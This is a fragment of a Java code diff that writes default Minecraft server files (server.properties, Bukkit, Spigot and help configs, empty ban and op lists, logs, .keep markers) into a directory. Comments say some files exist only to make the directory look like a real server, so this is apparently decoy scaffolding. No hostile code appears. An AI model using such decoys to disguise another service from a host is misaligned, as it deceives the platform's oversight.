+                 "initial-enabled-packs=vanilla\n" +
+                 "level-name=world\n" +
+                 "level-seed=\n" +
+                 "level-type=minecraft\\:normal\n" +
+                 "log-ips=true\n" +
+                 "max-chained-neighbor-updates=1000000\n" +
+                 "max-players=20\n" +
+                 "max-tick-time=60000\n" +
+                 "max-world-size=29999984\n" +
+                 "motd=A Minecraft Server\n" +
+                 "network-compression-threshold=256\n" +
+                 "online-mode=true\n" +
+                 "op-permission-level=4\n" +
+                 "player-idle-timeout=0\n" +
+                 "prevent-proxy-connections=false\n" +
+                 "pvp=true\n" +
+                 "query.port=" + port + "\n" +
+                 "rate-limit=0\n" +
+                 "rcon.password=\n" +
+                 "rcon.port=" + port + "\n" +
+                 "region-file-compression=deflate\n" +
+                 "require-resource-pack=false\n" +
+                 "resource-pack=\n" +
+                 "resource-pack-id=\n" +
+                 "resource-pack-prompt=\n" +
+                 "resource-pack-sha1=\n" +
+                 "server-ip=\n" +
+                 "server-port=" + port + "\n" +
+                 "simulation-distance=10\n" +
+                 "spawn-animals=true\n" +
+                 "spawn-monsters=true\n" +
+                 "spawn-npcs=true\n" +
+                 "spawn-protection=16\n" +
+                 "sync-chunk-writes=true\n" +
+                 "text-filtering-config=\n" +
+                 "text-filtering-version=0\n" +
+                 "use-native-transport=true\n" +
+                 "view-distance=10\n" +
+                 "white-list=false\n").getBytes());
+        }
+
+        // 4. bukkit.yml（标准 Paper/Bukkit 配置）
+        File bukkitYml = new File(workDir, "bukkit.yml");
+        if (!bukkitYml.exists()) {
+            Files.write(bukkitYml.toPath(),
+                ("# This is the main configuration file for Bukkit.\n" +
+                 "# As you can see, there's actually not that much to configure without any plugins.\n" +
+                 "# For a reference for any variable inside this file, check out the Bukkit Wiki at\n" +
+                 "# https://bukkit.fandom.com/wiki/Main_Page\n" +
+                 "\n" +
+                 "settings:\n" +
+                 "  allow-end: true\n" +
+                 "  warn-on-overload: true\n" +
+                 "  permissions-file: permissions.yml\n" +
+                 "  update-folder: update\n" +
+                 "  plugin-profiling: false\n" +
+                 "  connection-throttle: 4000\n" +
+                 "  query-plugins: true\n" +
+                 "  deprecated-verbose: true\n" +
+                 "  shutdown-message: Server closed\n" +
+                 "  minimum-api: none\n" +
+                 "  use-map-convert-cache: true\n" +
+                 "spawn-limits:\n" +
+                 "  monsters: 70\n" +
+                 "  animals: 10\n" +
+                 "  water-animals: 5\n" +
+                 "  water-ambient: 20\n" +
+                 "  ambient: 15\n" +
+                 "chunk-gc:\n" +
+                 "  period-in-ticks: 600\n" +
+                 "ticks-per:\n" +
+                 "  animal-spawns: 400\n" +
+                 "  monster-spawns: 1\n" +
+                 "  water-spawns: 1\n" +
+                 "  ambient-spawns: 1\n" +
+                 "  autosave: 6000\n" +
+                 "aliases: now-in-commands.yml\n").getBytes());
+        }
+
+        // 5. spigot.yml
+        File spigotYml = new File(workDir, "spigot.yml");
+        if (!spigotYml.exists()) {
+            Files.write(spigotYml.toPath(),
+                ("# This is the main configuration file for Spigot.\n" +
+                 "# As you can see, there's actually not that much to configure without any plugins.\n" +
+                 "\n" +
+                 "settings:\n" +
+                 "  save-user-cache-on-stop-only: false\n" +
+                 "  bungeecord: false\n" +
+                 "  log-villager-deaths: true\n" +
+                 "  log-named-deaths: true\n" +
+                 "  sample-count: 12\n" +
+                 "  player-shuffle: 0\n" +
+                 "  moved-wrongly-threshold: 0.0625\n" +
+                 "  moved-too-quickly-multiplier: 10.0\n" +
+                 "  netty-threads: 4\n" +
+                 "  attribute:\n" +
+                 "    maxHealth:\n" +
+                 "      max: 2048.0\n" +
+                 "    movementSpeed:\n" +
+                 "      max: 2048.0\n" +
+                 "    attackDamage:\n" +
+                 "      max: 2048.0\n" +
+                 "messages:\n" +
+                 "  whitelist: You are not whitelisted on this server!\n" +
+                 "  unknown-command: Unknown command. Type \\\"/help\\\" for help.\n" +
+                 "  server-full: The server is full!\n" +
+                 "  outdated-client: Outdated client! Please use {0}\n" +
+                 "  outdated-server: Outdated server! I'm still on {0}\n" +
+                 "  restart: Server is restarting\n" +
+                 "commands:\n" +
+                 "  replace-commands:\n" +
+                 "  - setblock\n" +
+                 "  - summon\n" +
+                 "  - testforblock\n" +
+                 "  - tellraw\n" +
+                 "  log: true\n" +
+                 "  tab-complete: 0\n" +
+                 "  send-namespaced: true\n" +
+                 "world-settings:\n" +
+                 "  default:\n" +
+                 "    verbose: false\n" +
+                 "    merge-radius:\n" +
+                 "      item: 2.5\n" +
+                 "      exp: 3.0\n" +
+                 "    item-despawn-rate: 6000\n" +
+                 "    arrow-despawn-rate: 1200\n" +
+                 "    trident-despawn-rate: 1200\n" +
+                 "    zombie-aggressive-towards-villager: true\n" +
+                 "    nerf-spawner-mobs: false\n" +
+                 "    enable-zombie-pigmen-portal-spawns: true\n" +
+                 "    wither-spawn-sound-radius: 0\n" +
+                 "    end-portal-sound-radius: 0\n" +
+                 "    hanging-tick-frequency: 100\n" +
+                 "    zombie:\n" +
+                 "      aggregate-chunks: true\n" +
+                 "    growth:\n" +
+                 "      cactus-modifier: 100\n" +
+                 "      cane-modifier: 100\n" +
+                 "      melon-modifier: 100\n" +
+                 "      pumpkin-modifier: 100\n" +
+                 "      sapling-modifier: 100\n" +
+                 "      beetroot-modifier: 100\n" +
+                 "      carrot-modifier: 100\n" +
+                 "      potato-modifier: 100\n" +
+                 "      wheat-modifier: 100\n" +
+                 "      netherwart-modifier: 100\n" +
+                 "      vine-modifier: 100\n" +
+                 "      cocoa-modifier: 100\n" +
+                 "      bamboo-modifier: 100\n" +
+                 "      sweetberry-modifier: 100\n" +
+                 "      kelp-modifier: 100\n" +
+                 "      twistingvines-modifier: 100\n" +
+                 "      weepingvines-modifier: 100\n" +
+                 "      cavevines-modifier: 100\n" +
+                 "      glowberry-modifier: 100\n" +
+                 "    max-tnt-per-tick: 100\n" +
+                 "    max-tick-time:\n" +
+                 "      tile: 50\n" +
+                 "      entity: 50\n" +
+                 "    mob-spawn-range: 8\n" +
+                 "    simulation-distance: default\n" +
+                 "    view-distance: default\n" +
+                 "    entity-activation-range:\n" +
+                 "      animals: 32\n" +
+                 "      monsters: 32\n" +
+                 "      raiders: 48\n" +
+                 "      misc: 16\n" +
+                 "      water: 16\n" +
+                 "      flying-monsters: 32\n" +
+                 "    entity-tracking-range:\n" +
+                 "      players: 48\n" +
+                 "      animals: 48\n" +
+                 "      monsters: 48\n" +
+                 "      misc: 32\n" +
+                 "      other: 64\n" +
+                 "    ticks-per:\n" +
+                 "      hopper-transfer: 8\n" +
+                 "      hopper-check: 1\n" +
+                 "    hopper-amount: 1\n" +
+                 "    hopper-can-load-chunks: false\n" +
+                 "    dragon-death-sound-radius: 0\n" +
+                 "    seed-village: 10387312\n" +
+                 "    seed-desert: 14357617\n" +
+                 "    seed-igloo: 14357618\n" +
+                 "    seed-jungle: 14357619\n" +
+                 "    seed-swamp: 14357620\n" +
+                 "    seed-monument: 10387313\n" +
+                 "    seed-shipwreck: 165745295\n" +
+                 "    seed-ocean: 14357621\n" +
+                 "    seed-outpost: 165745296\n" +
+                 "    seed-endcity: 10387313\n" +
+                 "    seed-slime: 987234911\n" +
+                 "    seed-nether: 30084232\n" +
+                 "    seed-mansion: 10387319\n" +
+                 "    seed-fossil: 14357921\n" +
+                 "    seed-portal: 34222645\n" +
+                 "    seed-ancientcity: 20083232\n" +
+                 "    seed-trailruins: 83469867\n" +
+                 "    seed-buriedtreasure: 10387320\n" +
+                 "    seed-mineshaft: default\n" +
+                 "    seed-stronghold: default\n" +
+                 "    hunger:\n" +
+                 "      jump-walk-exhaustion: 0.05\n" +
+                 "      jump-sprint-exhaustion: 0.2\n" +
+                 "      combat-exhaustion: 0.1\n" +
+                 "      regen-exhaustion: 6.0\n" +
+                 "      swim-multiplier: 0.01\n" +
+                 "      sprint-multiplier: 0.1\n" +
+                 "      other-multiplier: 0.0\n" +
+                 "    max-growth-height:\n" +
+                 "      cactus: 3\n" +
+                 "      reeds: 3\n" +
+                 "      bamboo:\n" +
+                 "        min: 11\n" +
+                 "        max: 16\n" +
+                 "    entity-broadcast-range-percentage: 100\n" +
+                 "config-version: 12\n").getBytes());
+        }
+
+        // 6. commands.yml
+        File commandsYml = new File(workDir, "commands.yml");
+        if (!commandsYml.exists()) {
+            Files.write(commandsYml.toPath(),
+                ("# This is the commands configuration file for Bukkit.\n" +
+                 "# For documentation on how to make use of this file, check out the Bukkit Wiki at\n" +
+                 "# https://bukkit.fandom.com/wiki/Commands.yml\n" +
+                 "\n" +
+                 "command-block-overrides: []\n" +
+                 "aliases:\n" +
+                 "  icanhasbukkit:\n" +
+                 "  - \"version\"\n").getBytes());
+        }
+
+        // 7. help.yml
+        File helpYml = new File(workDir, "help.yml");
+        if (!helpYml.exists()) {
+            Files.write(helpYml.toPath(),
+                ("# This is the help configuration file for Bukkit.\n" +
+                 "\n" +
+                 "general:\n" +
+                 "  test: false\n" +
+                 "  max-per-page: -1\n" +
+                 "  full-list: false\n" +
+                 "  title: 'Minecraft Help'\n" +
+                 "  command-prefix: '/'\n" +
+                 "  replace-override: 'replace'\n" +
+                 "  list-of-commands: 'Commands'\n" +
+                 "  search: 'Search'\n" +
+                 "  click-to-copy: 'Click to copy'\n" +
+                 "  click-to-copy-tooltip: 'Click to copy this command to your clipboard'\n" +
+                 "  no-results: 'No results'\n" +
+                 "  no-description: 'No description available'\n" +
+                 "  no-usage: 'No usage available'\n" +
+                 "  no-permission: 'You do not have permission to use this command'\n" +
+                 "  no-permission-short: 'No permission'\n" +
+                 "  click-to-copy-help-tooltip: 'Click to copy this command to your clipboard'\n" +
+                 "  invalid-page: 'Invalid page number'\n" +
+                 "  invalid-page-short: 'Invalid page'\n" +
+                 "  next-page: 'Next page'\n" +
+                 "  previous-page: 'Previous page'\n" +
+                 "  page: 'Page'\n" +
+                 "  of: 'of'\n" +
+                 "  showing: 'Showing'\n" +
+                 "  results: 'results'\n" +
+                 "  result: 'result'\n" +
+                 "  for: 'for'\n" +
+                 "  search-results: 'Search results'\n" +
+                 "  show-all: 'Showing all commands'\n" +
+                 "  show-permitted: 'Showing permitted commands'\n").getBytes());
+        }
+
+        // 8. permissions.yml
+        File permsYml = new File(workDir, "permissions.yml");
+        if (!permsYml.exists()) {
+            Files.write(permsYml.toPath(),
+                ("# This is the permissions configuration file for Bukkit.\n" +
+                 "# For documentation on how to make use of this file, check out the Bukkit Wiki at\n" +
+                 "# https://bukkit.fandom.com/wiki/Permissions.yml\n" +
+                 "\n" +
+                 "default:\n" +
+                 "  default: true\n").getBytes());
+        }
+
+        // 9. 空的 JSON 文件（数组格式）
+        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json",
+                              "usercache.json", "whitelist.json"};
+        for (String f : jsonFiles) {
+            File jf = new File(workDir, f);
+            if (!jf.exists()) {
+                Files.write(jf.toPath(), "[]".getBytes());
+            }
+        }
+
+        // 10. version_history.json
+        File versionHistory = new File(workDir, "version_history.json");
+        if (!versionHistory.exists()) {
+            String ts = new Date().toInstant().toString();
+            Files.write(versionHistory.toPath(),
+                ("{\n" +
+                 "  \"1.21.4\": \"" + ts + "\"\n" +
+                 "}").getBytes());
+        }
+
+        // 11. logs/latest.log（空文件）
+        File latestLog = new File(workDir, "logs/latest.log");
+        if (!latestLog.exists()) {
+            latestLog.createNewFile();
+        }
+
+        // 12. plugins 目录放个 README（看起来像有插件管理）
+        File pluginsReadme = new File(workDir, "plugins/README.txt");
+        if (!pluginsReadme.exists()) {
+            Files.write(pluginsReadme.toPath(),
+                ("# Place any plugin jars in this directory.\n" +
+                 "# Plugins will be loaded automatically on server start.\n").getBytes());
+        }
+
+        // 13. config 目录放个空文件
+        File configMarker = new File(workDir, "config/.keep");
+        if (!configMarker.exists()) {
+            configMarker.createNewFile();
+        }
+
+        // 14. cache 目录放个空文件
+        File cacheMarker = new File(workDir, "cache/.keep");
+        if (!cacheMarker.exists()) {
+            cacheMarker.createNewFile();
+        }
+
+        // 15. versions 目录放个空文件
+        File versionsMarker = new File(workDir, "versions/.keep");
+        if (!versionsMarker.exists()) {
+            versionsMarker.createNewFile();
+        }
+
+        // 16. libraries 目录放个空文件
+        File libMarker = new File(workDir, "libraries/.keep");
+        if (!libMarker.exists()) {
+            libMarker.createNewFile();
+        }
     }
 }
